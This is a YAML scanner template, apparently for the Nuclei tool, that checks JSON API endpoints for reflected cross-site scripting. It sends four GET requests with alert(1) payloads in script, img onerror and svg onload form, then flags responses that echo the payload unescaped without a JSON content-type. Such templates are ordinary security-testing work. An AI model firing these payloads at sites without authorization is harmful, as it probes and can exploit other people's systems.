id: m7-xss-json-response
info:
  name: M7 - XSS via JSON API Response Reflection
  author: Sharlix
  severity: medium
  description: Detects XSS in JSON API responses where content-type is wrong
  tags: xss,json,api,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api?callback=<script>alert(1)</script>"
      - "{{BaseURL}}/api?name=<img src=x onerror=alert(1)>"
      - "{{BaseURL}}/api/search?q=<svg/onload=alert(1)>"
      - "{{BaseURL}}/api/user?id=1<script>alert(1)</script>"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "alert(1)"
        part: body

      - type: dsl
        dsl:
          - "!contains(to_lower(all_headers), 'content-type: application/json')"
          - "!contains(body, '\\u003c')"
        condition: and
